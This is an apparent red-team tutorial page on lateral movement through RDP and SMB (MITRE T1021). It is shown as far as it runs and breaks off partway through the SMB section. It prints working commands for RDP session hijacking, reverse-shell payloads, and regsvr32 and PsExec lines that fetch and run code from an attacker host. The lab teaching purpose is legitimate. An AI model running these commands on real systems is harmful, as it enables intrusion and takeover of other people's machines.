@@ -1,0 +1,356 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/lateral-movement/" rel="category tag">Lateral Movement</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Lateral Movement: Remote Services (Mitre:T1021)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/lateral-movement-remote-services-mitret1021/" rel="bookmark"><time class="entry-date published" datetime="2022-03-27T16:29:50+00:00">March 27, 2022</time><time class="updated" datetime="2025-06-23T19:10:59+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">During Red Team assessments, after an attacker has compromised a system, they often move laterally through the network, gaining more relevant information on other systems. This lateral movement is possible through the use of various binaries, services, and processes. In this article, we will focus solely on Lateral Movement using Remote Services, i.e., services that help execute code or commands on remote systems by using invalid credentials. Often, the same set of credentials are used across an organization, which makes this type of lateral movement highly effective.</span></p>
+<ul>
+<li><strong><span style="color: #000000;">MITRE TACTIC: Lateral Movement (TA0008)</span></strong></li>
+<li><strong><span style="color: #000000;">MITRE TECHNIQUE ID: T1021 (Remote Services)</span></strong></li>
+<li><strong><span style="color: #000000;">SUBTITLE: Multiple Titles (T1021.001, T1021.002, T1021.003, T1021.004, T1021.005, T1021.006)</span></strong></li>
+</ul>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;">Background</span></li>
+<li><span style="color: #000000;">Understanding Attack Lab</span></li>
+<li><span style="color: #000000;">Lateral Movement through RDP (T1021.001)</span>
+<ul>
+<li><span style="color: #000000;">RDP Hijacking using Task Manager</span></li>
+<li><span style="color: #000000;">RDP Hijacking using Tscon</span></li>
+<li><span style="color: #000000;">RDP Hijacking using Mimikatz</span></li>
+<li><span style="color: #000000;">SharpRDP Authenticated Code Execution</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Lateral Movement through SMB (T1021.002)</span>
+<ul>
+<li><span style="color: #000000;">PsExec SMB RCE</span></li>
+<li><span style="color: #000000;">exe process creation</span></li>
+<li><span style="color: #000000;">Metasploit SMB Remote PsExec</span></li>
+<li><span style="color: #000000;">exe SMB RCE</span></li>
+<li><span style="color: #000000;">exe SMB RCE</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Lateral Movement through DCOM (T1021.003)</span>
+<ul>
+<li><span style="color: #000000;">application remote DCOM</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Lateral Movement through SSH (T1021.004)</span>
+<ul>
+<li><span style="color: #000000;">SSH Port Forwarding</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Lateral Movement through VNC (T1021.005)</span>
+<ul>
+<li><span style="color: #000000;">VNCinject payload</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Lateral Movement through WinRM (T1021.006)</span>
+<ul>
+<li><span style="color: #000000;">New-PSSession Powershell</span></li>
+<li><span style="color: #000000;">Invoke-Command Powershell</span></li>
+<li><span style="color: #000000;">Winrs</span></li>
+<li><span style="color: #000000;">Evil-Winrm</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Lateral Movement through Mimikatz</span></li>
+<li><span style="color: #000000;">Lateral Movement through WMI</span></li>
+<li><span style="color: #000000;">Lateral Movement through Invoke-WmiMethod</span></li>
+<li><span style="color: #000000;">Conclusion</span></li>
+</ul>
+<h3><span style="color: #800000;">Background</span></h3>
+<p><span style="color: #000000;">Ultimately, lateral movement is useful for gathering more data by compromising multiple systems instead of relying on just a single system. This method enables attackers to gain higher <strong data-start="956" data-end="970">privileges</strong> and eventually compromise the entire <strong data-start="1008" data-end="1019">network</strong>.</span></p>
+<p><span style="color: #000000;">Certain <strong data-start="1035" data-end="1047">services</strong> are designed specifically to provide remote sessions, and they accept connections when valid <strong data-start="1141" data-end="1156">credentials</strong> are provided. However, in domain networks, basic authentication is replaced by <strong data-start="1240" data-end="1252">Kerberos</strong>. Still, a valid set of credentials can be used across the network and on multiple devices. For example, an <strong data-start="1360" data-end="1380">HR admin account</strong> can log in to any <strong data-start="1399" data-end="1412">HR system</strong>, enabling an attacker to fetch more <strong data-start="1449" data-end="1457">data</strong> by moving laterally.</span></p>
+<p><span style="color: #000000;">The aim of this article is to demonstrate as many methods as possible by exploiting the most well-known <strong data-start="1589" data-end="1608">remote services</strong>, including <strong data-start="1620" data-end="1627">RDP</strong> and <strong data-start="1632" data-end="1639">SSH</strong>. By the end of the article, we will discuss services like <strong data-start="1698" data-end="1710">mimikatz</strong> and <strong data-start="1715" data-end="1722">WMI</strong>. These services typically use one or more combinations of remote services to provide remote sessions.</span></p>
+<p><span style="color: #000000;">Let’s begin with <strong data-start="1852" data-end="1859">RDP</strong> first and gradually explore other services.</span></p>
+<h3><span style="color: #800000;">Understanding Attack Lab</span></h3>
+<p><span style="color: #000000;">For the article I have two setups in hand. One is an Active Directory setup with the domain “ignite.local” and the other is simple 2 windows devices connected on bridged with a Kali system in a non-domain environment. The details are as follows:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrzWBuMtUVMJ4f-cz_YZplkYoIelCvRsx2oQYtCDcC_eAMvBR19ZnTzbGrgBCEVNr_qnVk-knnB2G5wTdN51sHRuJSd5Xl6tlTzBLYBcDSprWLdFXXv6JMSUGuhZyrdSkVAjt5QE1kD6q_2qla5fUF5bqOAj9T5RtcLdkqslOawqcRaKM1ptOD32rCTg/s16000/0.png"/></span></p>
+<h3><span style="color: #800000;">Lateral Movement through RDP (T1021.001)</span></h3>
+<p><span style="color: #000000;">According to <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol">Microsoft</a></strong></span>, RDP is based on, and is an extension of, the T-120 family of protocol standards. A multichannel capable protocol allows for separate virtual channels for carrying the following information:</span></p>
+<ul>
+<li><span style="color: #000000;">presentation data</span></li>
+<li><span style="color: #000000;">serial device communication</span></li>
+<li><span style="color: #000000;">licensing information</span></li>
+<li><span style="color: #000000;">highly encrypted data, such as keyboard, mouse activity</span></li>
+</ul>
+<p><span style="color: #000000;">In other words, it lets a user communicate with a remote server by providing him a fully functional GUI.</span></p>
+<h4><span style="color: #800000;">RDP Hijacking using Task Manager</span></h4>
+<p><span style="color: #000000;">When you connect to a user “Administrator” and open task manager-&gt; go to users-&gt; you’d see this if a user “hex” is signed out currently but exists.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8UwTnXTVBDoJIjvbmNR2wVOpyBjxZoHi2H3efnroI-nXxB7kUsFN-yaVec8VGkog8a6Ps86vnXrKhb9O8cVeYz0qhExKwBAwnnoTUkSgL-plzCxUJNl6CCpNZRCRFUlMmop5m2VgT-gGHfgBqpC4HhXEhVCbIkwdau5dYM2OjzZLnrSN1WJ7gx1JOZg/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">Here, you can click on hex and choose to connect</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibL5nZrGGyfCAps2TlKLNiAjRYg_su3zeB5tBGgebKAciUzvRxtNQ-P3CZu_AYkV57ihHm_4DK6zxvidYZB0ekllfJ2Xla73_Ub2kHxTGEDd_bRknCXSL51qjeZPF8N2jpU84hRkslynhC7A9pI3YnnleqJ4Bcn2m2RS9UjQw1crer7SNU1E1t6bZkmQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Next, Task manager would now ask for the credentials for user hex</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhOL1KvSBTPA7VWHj-vFpl8WZheO3AQ8RWNJKUwjtPGlkXarXB7UOGTPanni_zc77neoPokrj5yMEpnrkazzEbKZCSW3dXeuN_spIO5jnDFK8WnDU5N5MVgBp9y21lbe6aFwmibwBhpTn6D0SyzUogMuvVEkNw8Yt1uXpcG-qgtCr3O8j2K_SHVxxHQAQ/s16000/3.png"/></span></p>
+<p> </p>
+<p><span style="color: #000000;">Lastly, You’d be successfully connected to hex now. As it can be confirmed in cmd</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglIxlueqtXN4zDUoDORnryr9mfxhRtBpgwRxoC1Vi5gEfMfnsf1QO-zkCd_FY1XEliDDR1uN9dLdr2ppdg_Q2C6z-FFTuLLQG9LFlcB2pHfVEpKRXhkuhZPBUKxsdgA38f0kM5CY8zxPFHl7HQGWpAW_jQiRpf1RszJBDwmInuRkFyX_K62DH5CN5nwA/s16000/4.png"/></span></p>
+<h4><span style="color: #800000;">RDP Hijacking using Tscon</span></h4>
+<p><span style="color: #000000;">tscon is a Microsoft Windows utility that was introduced the release of Windows Server 2012. It is used to connect to another session on a Remote Desktop Session Host server. It requires the destination and the session id to work. The User credentials can also be passed as parameters in tscon. Read more about it <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">Now the interesting thing is, if you have managed to achieve SYSTEM level permissions (NT AUTHORITY\SYSTEM), you could switch RDP sessions using tscon without needing password. This worked on older versions of Windows 10 flawlessly. In newer versions, there is still a need for passwords.</span></p>
+<p><span style="color: #000000;">So, we first achieve NT AUTHORITY\SYSTEM on our compromised system using psexec and then see interactive sessions. We switch to the desired session (number 3 here) and use /DEST switch to switch current connection (rdp-tcp#9) with the user in 3<sup>rd</sup> session.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">whoami
+psexec64.exe -s cmd
+whoami
+query user
+cmd /k tscon 3 /DEST:rdp-tcp#9</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiR326WYaKMMD0mTHM4wdWejoNGaDT05rM3T8J2rSzJgpwuI7mqL-UI1jHe7AOg643hyK2bB9ieuGEpx92_RSu849B-T90AEh6upm6XkYMXhPlf-WIMeQtg3wUrN5AVyA6KJ-axFr_Ix4KG5jM5HXQIJ2dNtB2eMANxO0j98C7S-tki05FEo-3L0gehQw/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Thus, it will immediately open a new user “hex” in the same Remote Desktop Connection! This can be verified by whoami</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdbDxe9AfbBr_ofCuAkIAuh2V7r5ibgLzFouT5mB7gkiK7hM5k93WQ0PFqFsoiPQpqRGNRuk6O7TFiPdwvpQA_7xKAgm7TCTKuSWiHyoUQuVgVc_BunPFa5l1H7cb9D65eMk1hizsN4PlntKlD7EWf5be28LVYZZdsUWXWVGKQCOkIA7FxEssxQc77jQ/s16000/6.png"/><br/>
+</strong></span></p>
+<h4><span style="color: #800000;">RDP Hijacking using Mimikatz</span></h4>
+<p><span style="color: #000000;">Mimikatz includes a module “ts” to play with RDP sessions. It is an implementation of tscon only with added features of mimikatz. We can see active user sessions using</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ts::sessions</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXUsKIuox50VQD0kpqSvOqqw0zP1zEp2mFxHtH1p_GizC0Q-bFTR_9kpn9kdaYY_ZmkPEf2F_j7v4RisWVsocc6oqpXsFKkcNfK3H3sNBoc6iVs7MtB6Z8yCGAZ8uFvrl4rIEiBsCdTnOIrAsA9GYqsWBVU-AEeaGuYwBwO4eX5ADaddiSO_UsyGh-Tw/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">We have a disconnected user hex on session ID 3. Let’s connect to it. What we did using psexec, mimikatz does it automatically by using token impersonation to elevate privileges.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
+token::elevate
+ts::remote /id:3</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4JX5G2XMtXbPPgEt7WW9un2I5tQ2hZwtX6YxXhk20HDIptBpKPMMlIOCci4XHxo4aoE_F_PhF48e0f58jU0bcOSidHC1qg8EvaGuouO55qq1mPYDNrRH-n_6yH6PnyUJhHH4XdHKYyfXnCZUlxi5rZ6lJEkQtakQAbexMM7HMk1mkj7RPLlLacgzt8w/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">And then you’d be presented with user “hex’s” remote desktop!</span></p>
+<h4><span style="color: #800000;">SharpRDP Authenticated Command Execution</span></h4>
+<p><span style="color: #000000;">0xthirteen developed the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/0xthirteen/SharpRDP">SharpRDP</a> </strong></span>tool which provides various methods and techniques for authenticated command execution using RDP as a service. This method won’t include hijacking over remote sessions, rather, using logon information to provide code execution. It does so this by utilising COM library and mstscax.dll. Read more <a style="color: #000000;" href="https://0xthirteen.com/2020/01/21/revisiting-remote-desktop-lateral-movement/"><span style="color: #0000ff;"><strong>here</strong></span>.</a></span></p>
+<p><span style="color: #000000;">First, we will create a payload</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.0.89 lport=1337 -f exe &gt; shell.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggHg_X5dOHz3Hkk3bYo_sMTyXVHhRVHlnJnmpqcdtBqODAAaVXsQHTsKH-tQ7p5h4lLx5Vxe92QE7u_9PMHqTWm3VXIDT_dZygPUeFOeGtsyk0H3BLXNOBL1be-5kR2_6TXOrNWLvcFnl-EuMRaBuBop-NzRQ4k5iFhRUxU-stybBI69zMkJ5I6JjG9Q/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Next, we will host this file in our SMB share. We can set up a share manually or use Impacket’s smbserver to set up a temporary share with the name “sharename”</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbserver.py sharename /root</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhC9bh_H1wrY8lbGBSQlWoJhmGqfSiWinQDehTPaidsqrJOkuyKFUR1qtU75SX46Cr1Y-2q8f11oDqc7FZoaD7F3gf61uT05M7542XN38NwV7aF4rNWfd7O10Kxvu73Un7a1rx70ljvnUxkrwVQBSoaNnk9dLVEMYcNFuwx2ELwjbf_3eGcihqPgx_yIQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Now, using the credentials available to us of a remote user Administrator, we can use SharpRDP to execute this EXE file by providing in the UNC Path below</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">SharpRDP.exe computername=DESKTOP-9GSGK09 command="cmd.exe /c \\192.168.0.89\sharename\shell.exe username=Administrator password=123</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgf49V7jMLReod22fWKQ8vsDNG2Lj4TQFCqYAAFFN-JFwN3Avd3E-MRePegVtOFx84Vn4Qi5tZWAJ38d4-gQM2p9-RSFd2CdQXjaXTcEUM6y3XAUcuN66yw_AGgwllvl5PQ4svnbNO2RRhxWymZB5otyMGf52_vTJQ-LVl_QG0HQ7wmtAp5Q90CyNoRbQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">As you can see, the remote server hit our SMB Server and fetched the file</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6El22qXnm1_ebS4-KW9ICUw3lnFLPcoBS7Ux4Gv9sDbjExsJQJdsXlkJQ4ntoXhkIva5GWBpg_18eaD1SspmzdvlwKSfDWXSS10QIonlnKsBgL28gSafH2NfvvLDGYoAObxzccxiBqHHqtqTa0H2rsz-PiLxZiOvLnVeedBGlY2LO3WbBU3qw1v95xg/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Finally, w</span><span style="color: #000000;">e have moved laterally successfully this way!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSm7nTtCiBs1aRITp1ZuxiSBAu2N_vEATZMub83ZvVcqGQbLncJX01h5nzVv-NCr5XngIkvYjBARkfm6LRJKoJwY2xnXS1NezJaAWKr6OXbu33zSU4WZv2CHCbuyttzZb38Xjs9IHGx2fWPZfznnjIpBPLPQSkpshoKf8hEmBgRkNdmOaWlbXzxqw1nQ/s16000/13.png"/></span></p>
+<h3><span style="color: #800000;">Lateral Movement through SMB (T1021.002)</span></h3>
+<p><span style="color: #000000;">SMB is one of the most widely used network protocol that allows users to communicate with remote systems across a network. Generally, it is used for sharing files, printers but by utilising writeable shares, it can be used to conduct command execution, and eventually lateral movement.</span></p>
+<h4><span style="color: #000000;">PsExec SMB RCE</span></h4>
+<p><span style="color: #000000;">Many tools like psexec utilise SMB to conduct authenticated command execution. According to Microsoft, “PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec’s most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems.” First, let’s use impacket’s smbserver to create a local SMB share that will host our malicious file. This file will eventually be written on remote systems and executed to gain movement.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbserver.py sharename /root</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTTSqg15bXzN38wDkE-5LIjGbkGTX7uLFI1YkUY_qrKr6FT1-x6NBd3vte1rCXPf97uPje18Z6dnmV93L5iqxIWeE7PATbuuxxQ66aoDV2JJNvErk13QtV26_C_Dxm98mfJxKnb5pBK1KCXFgreu4UG3CM5vXWKmJtCfgLx1XS5S36lZZk-458Rw2Ufw/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Thereafter, we will now create a malicious file using msfvenom</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.89 LPORT=1337 -f exe &gt; shell.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoEybnTFs0zgFlm6dIHN-MiHo2NSj7RZBwIUNYPM4didelZ8JZ1avkfmBhnxSwbvoGfcsNz23oY4TWGBam5sfKQI3grbwz1KGXYHBco00T6MtmBJmFWTGT-bdZJeCah_GsT9CqXq2NMUo7XNhFfYUl5Bda02eWgdj5kye8wZ4HvLZsOrNmU9YKQR_oHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Now, we will use the compromised system and upload psexec64.exe in it. Then, we will use the following command to launch our malicious file in the host specified.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">psexec64.exe \\DESKTOP-9GSGK09 -u hex -p 123 cmd.exe /c \\192.168.0.89\sharename\shell.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgakf4I9DoJkuGi_WnH76nxMfDzb9B7js8XXBgukLBIAGCjW9XtP6YfJ9zaUo3UFVghONQtUTiutfMIJOxcxJdDZjq6deQzxAQTppqqMa59uEADJVfBI6IhYDzajEYNosz--yW3EM6EnEk9OG8HrNsf9s41V1H2tSLmwWVx8FziQEpX97FutHad09_lyA/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">As you can see, hex has reached our smb share and fetched the file</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqNlGiyck0fBKUEuZE4_eltP9fj1vjtw91zF0MegOqH3yGQuPBLbvIUi0hm5OiW8ohGVjL9wUy5OYYu3L-jTUy0_gzcMkdQJx3URDpMXfaJQzZ8ZcaIPvwI6FIAvpMrKsgMtyfy9kisyOcv2jpAF94eS6C5v1Bc4wTsIdbNcMlKkh5kpV5FqsB4mbPDg/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">And hence, we have successfully received a reverse shell back!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoynJY6etbah8L3YpMzU9KMi3k-BtYe6FaoRbHTRI6kpIv701UXPA6sVuEy5Qkxqgs6LJ0dKGP29SBYARYvWtjNgjpOmQnAUBYJLInJYrCcp3zEp_fvT_bi89r1eZ28mKLxMn7AV9VIA6NycBMuaNftHzJPu-KaT2aa9u2yiD0EtPUv2QRZ9BpIuUxgw/s16000/19.png"/></span></p>
+<h4><span style="color: #000000;">Sc.exe process creation</span></h4>
+<p><span style="color: #000000;">sc.exe is a command-line tool that comes bundled with Windows and offers the functionality to maintain and administer Windows NT services. This is a non-essential system process, however, it can be used to create processes and execute DLLs in them. Here, we will create a process “ignite” and use regsvr method to define the executing DLL within that process.</span></p>
+<p><span style="color: #000000;">First, let’s set up our handler and generate regsvr code using Metasploit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.89
+set LPORT 1234
+set target 3
+run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhwx0Fj0Scnu-7dVKa_korORxjkyG2IEyE_TpwU-j3YHyHLCmUJl0LTlTJ74E1sJLeH2GUhoddNdR0dXQ8-nG7BgPcBSWCPAvgApPqGH_auMqe1OG6DLwI1s173PD7fOfBroLML1LBgA85eUWle8TuPaKSwVc0D6uMoXYYdKdz38_e9BvjWmNFXFwUw_w/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">Now, the regsvr code that we obtained can be included within the sc.exe binpath command. The following command creates a process ignite with the above code in it. It then starts the same. Please note that “DESKTOP-9GSGKO9” is the destination windows system, where the code is to be executed.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc \\DESKTOP-9GSGKO9 create ignite binpath= "C:\Windows\System32\regsvr32 /s /n /u /i:http://192.168.0.89:8080/nGU8JQ0b9OjF.sct scrobj.dll"
+sc \\DESKTOP-9GSGKO9 start ignite</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZW8puxBbpVODwXt0z4gIJZoiGZdnJxd_3WV4ucEnvGdrRY40en5yfGXCJ2CMIKpjfKkjxbCHJMw8ouN_MtKOxexpYBVZTY5L376clTIv4ykn397y2UqqyVii2m0XVEGYPenhUDoLC1-IZbAnXezRTmNrmd8YojNgV2-EYv8_3Y4rkvV1jH9hrXZsDIw/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">As you can see, a service start failed error has been obtained but that is because the DLL we provided isn’t a valid one. It would still execute our DLL and give us a reverse shell! Here, we had the Admin authority over the writeable shares in the remote system so we received an NT AUTHORITY\SYSTEM privilege but depending on the rights you have, this may vary.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiIS6MiDjaExhEcD40sRz0d8dQqUWQ5DG2TahGNWebHxRAfA8_IBU0I3K5qnLxV84pi21sjH7ZOLoE7yD9WMXv4mO2uOf0Si1FdFxDDwbnR0OSEZhHTz6Om8Led6c7VnqQKE9hVOewTFIOiEGy2Oy3R2zLb5eLdWeKcZTptItOj8Tmny-K6d6qsxAsJAw/s16000/22.png"/></span></p>
+<h4><span style="color: #000000;">Metasploit SMB Remote PsExec</span></h4>
+<p><span style="color: #000000;">A Metasploit psexec module exists which can compromise a remote system if SMB is reachable on the target and the credentials provided are valid. Here, lets say we obtained SMB credentials Administrator:123, we can use these credentials across the network and compromise other systems with the same set of credentials. Here, you can see, we set the payload to be a meterpreter one and upon successful execution, we have received a web shell!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/psexec
+set payload windows/x64/meterpreter/reverse_tcp
+set RHOSTS 192.168.0.119
+set SMBUSER Administrator
+set SMBPASS 123
+set LHOST 192.168.0.89
+set LPORT 4444
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgW-al9jtzhlYyny5z_am6yf8q7NaItKgIdCi6JY8N1TqT_eIgXSnH0JS5rYXcB5kh-Vx4_ELMjBNhnXhUoHflv6K-HUML1A9W3WR_qRAzH9m9nZH3lS8bJG02dKuZgNV_BM5Tqai8Ivap2FkGUky6RCl1qcJ7UmuWh2mF3ALAL1jxbPgdUN8AItWQsg/s16000/23.png"/></span></p>
+<h4><span style="color: #000000;">Cmd.exe SMB RCE</span></h4>
+<p><span style="color: #000000;">Cmd.exe in Windows is also capable of executing commands on a remote system if the user has write access on critical shares like C$, ADMIN$ etc, cmd.exe can copy a file to locations like C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp and gain persistence in conjunction with lateral movement.</span></p>
+<p><span style="color: #000000;">However, in this example, we will just run a simple regsvr command and write its output to a file called ignite in ADMIN$ share demonstrating the write capability of the command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.89
+set LPORT 1234
+set target 3
+run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7KKQ2AwR6bn3Ka5EDCN78bvPtmu79BL_RX0dbdmLbiwJKyO-aLlAE7ULwqUXeDA1hpVHbSWl423gq4OKOG31a6D_uG-DreCX-pHCQz7LaDjCALIIkYA0W6y3F0rllqB9b-hm_wv0doRHz1F3cXCcZBYy3vYDS7NQhACVD4MpmH8v4u7t9ijylu9E5mg/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">Now, we run this using cmd.exe</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmd.exe /Q /c "C:\Windows\System32\regsvr32 /s /n /u /i:http://192.168.0.89:8080/jqVdIASVxjl4T.sct scrobj.dll" 1&gt; \\127.0.0.1\ADMIN$\ignite 2&gt;&amp;1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5O2F4vuRHjOSR0ZkvCLsSXgNMfuhS_B2TiNFu6d3pQP3GAGBEQNq7okoaufJtlR0tzJNB2GMv5HziScc9KDI8QfjoVj_aNz8lpQejE66U38GfZRCaZu66a_dLzQyx9I-_qpC4uBIWaAuj0bvCCe9eb-iD2JxyJrL3YEK0rmlHL3aMSH_LUM7f6Z4IJw/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">Finally, this gives us a reverse shell!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7cFC3rNDJ6o0VBGb05xJ0QARo9DblCZoLYctgLGxcCdpr-Y_bCsR0lh2BfdExU5AmZh1ixmF-EChoCKDBo8JKpmAf1thZKbStuqapaivm2lmGpQ2cp5yQAwd6fCa9HKLV8E-fwoBoFMCep-BvEDJpMfMY7FDiS8hYo2h0-hZfauMxbKKuLhniukiKkw/s16000/26.png"/></span></p>
+<p><span style="color: #000000;">As you can see, the output file has been created in the remote share we specified. Though there was no output so the file is empty, but it got created.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOyX9QEy0-KvU0hXBdbHPHHdV698Uh_rTzZ_7mwUWYIcFFgHCLEAIEMfumwOvIVUqXEfRmCLIhSKC2pEguO_9AP_j64Jz-mC3oXQycui6hhc6UEYj2y50xW4snS4ua_ZV8OyuOXD_Ca0o5jCC6liPx2dR4dhdatUT5XJU353-LYgsEhEyb9wqxYnrjcA/s16000/27.png"/></span></p>
